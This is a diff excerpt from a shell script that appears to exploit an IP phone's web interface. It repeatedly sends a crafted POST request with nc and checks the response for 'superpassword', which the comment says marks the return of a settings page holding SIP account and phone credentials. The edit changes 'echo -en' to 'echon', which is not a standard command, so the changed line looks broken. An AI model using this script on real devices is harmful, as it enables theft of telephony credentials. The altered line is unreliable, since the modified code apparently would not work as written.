@@ -126,7 +126,7 @@ req="POST /g HTTP/1.0\r\nContent-length: 13\r\n\r\nback=++Back++\r\n\r\n";
 
 while true
 do
-        res=`echo -en $req | nc -nv $host 80`;
+        res=`echon $req | nc -nv $host 80`;
         if echo $res | grep superpassword # if this gets returned, then we got the settings page with all SIP account and IP phone creds
         then
                 echo "GOT IT!"
